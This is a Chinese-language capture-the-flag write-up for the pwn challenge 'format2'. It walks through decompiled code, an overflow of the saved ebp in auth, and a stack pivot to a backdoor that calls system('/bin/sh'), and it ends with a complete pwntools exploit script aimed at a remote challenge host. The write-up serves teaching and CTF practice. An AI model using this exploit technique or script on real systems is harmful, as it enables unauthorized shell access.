# format2
### IDA分析
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-3Ch]
  int v5; // [esp+18h] [ebp-28h] BYREF
  _BYTE v6[30]; // [esp+1Eh] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-4h]

  memset(v6, 0, sizeof(v6));
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  printf("Authenticate : ", v4);
  _isoc99_scanf("%30s", v6);
  memset(&input, 0, 12);
  v5 = 0;
  v7 = Base64Decode(v6, &v5);
  if ( v7 > 0xC )
  {
    puts("Wrong Length");
  }
  else
  {
    memcpy(&input, v5, v7);
    if ( auth(v7) == 1 )
      correct();
  }
  return 0;
}
```
在correct函数发现后门地址
```c
void __noreturn correct()
{
  if ( input == -559038737 )
  {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
  exit(0);
}
```
auth函数存在溢出点
```c
BOOL __cdecl auth(int a1)
{
  char v2[8]; // [esp+14h] [ebp-14h] BYREF
  const char *v3; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h] BYREF

  memcpy(&v4, &input, a1);
  v3 = (const char *)calc_md5(v2, 12);
  printf("hash : %s\n", v3);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", v3) == 0;
}
```
memcpy传入的是v4的地址，而v4是int，最多也就8字节，因此这里可以溢出.
#### 分析
程序的流程是将我们输入的字符串进行BASE64解密后，再调用auth函数验证，成功就执行shell。但是auth函数存在溢出漏洞

auth布局
|0x4字节（esp）|栈顶|
|---|---|
|....|.....|
|0x8字节(ebp-0x8)|存储着v4的值|
0x4(ebp)|栈底上一个函数的ebp
0x4(ebp+0x4)|auth返回地址

并且主函数里做了判断，base64解密后的长度不能大于12
也就是说，我们的payload长度最长为12，我们可以溢出v4 到后面4个字节，也就是会覆盖auth的ebp的内容

我们知道，main进入auth函数时，是这样的

1. push ebp  
2. mov esp,ebp  
3. sub esp,0x28  

而退出auth函数时，即执行leave指令时，是这样的

1. mov esp,ebp  
2. pop ebp  
也就是说，auth的ebp存的内容为main的ebp

因此把auth的ebp写为input地址
为了便于分析,我们的input存入如下内容aaaabbbbcccc

那么auth依然正常退出到main，但是main的ebp变成了cccc当main要退出时,执行leave指令mov esp,ebp

esp变成了cccc,那么pop ebp就使得ebp = [cccc],

接下来,retn 即执行call [cccc+ 4]

因此，我们把bbbb改成我们的getshell的地址,把cccc改成input_addr，那么我们就能get shell。

因此payload：

```python
from pwn import *  
import base64  
  
context.log_level = 'debug'  
#sh = process('./format2')  
sh = remote("61.147.171.105",53717)  
elf = ELF('./format2')  
#bss段的input区域  
input_addr = elf.sym['input']  
getshell_addr = elf.sym['correct'] + 0x19  
  
sh.recvuntil('Authenticate :')  
  
#覆盖auth函数的ebp内容，也就是修改了上一个函数的ebp，使得上一个函数(main)的ebp指向了input_addr  
#那么，当main函数leave时，有  
#mov esp,ebp  ;esp = input_addr  
#pop ebp  ;ebp = aaaa  
#retn ; call getshell_addr  
payload = b'a'*4 + p32(getshell_addr) + p32(input_addr)  
  
sh.sendline(base64.b64encode(payload))  
  
sh.interactive() 

```